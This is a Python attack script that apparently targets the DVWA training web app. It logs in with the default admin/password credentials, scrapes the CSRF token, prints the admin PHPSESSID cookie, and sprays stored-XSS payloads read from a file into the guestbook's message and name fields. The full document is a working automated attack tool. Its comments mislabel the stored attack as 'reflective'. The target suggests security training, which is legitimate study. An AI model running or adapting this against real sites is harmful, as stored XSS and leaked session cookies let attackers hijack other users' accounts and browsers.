from requests.compat import urljoin
import requests
import sys
import re

def login(rhost):
    s = requests.session()
    login_url = "http://{}/login.php".format(rhost)
    req = s.get(login_url)
    match = re.search(r'([a-z,0-9]){32}', req.text)
    token = match.group(0)
    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
    return s


xss_sto_path = 'vulnerabilities/xss_s/'

data = {
    'btnSign': "Sign+Guestbook",
    'mtxMessage': "",
    'txtName': ""
}


# Stored XSS
def attack(rhost,session_object):
    xss_url = urljoin("http://"+rhost, xss_sto_path)
    # print(xss_url)
    xss_param_values = []
    xss_param_values.extend(open("xss.txt", "r", errors='replace').readlines())

    # Reflective XSS on the message
    data["txtName"] = "Just testing, really..."
    for v in xss_param_values:
        data["mtxMessage"] = v
        # Send message reflected xss
        r = requests.post(xss_url, data=data, cookies=session_object.cookies)

    # Reflective XSS on the name
    data["mtxMessage"] = "I'm doing nothing wrong..."
    for v in xss_param_values:
        data["txtName"] = v
        # Send message reflected xss
        r = requests.post(xss_url, data=data, cookies=session_object.cookies)

def main():
    rhost = sys.argv[1]
    sess = login(rhost)
    sess = attack(rhost, sess)
    print("")
    # print("The query result is: {}".format(extracted_data))
        
if __name__ == "__main__":
    main()


    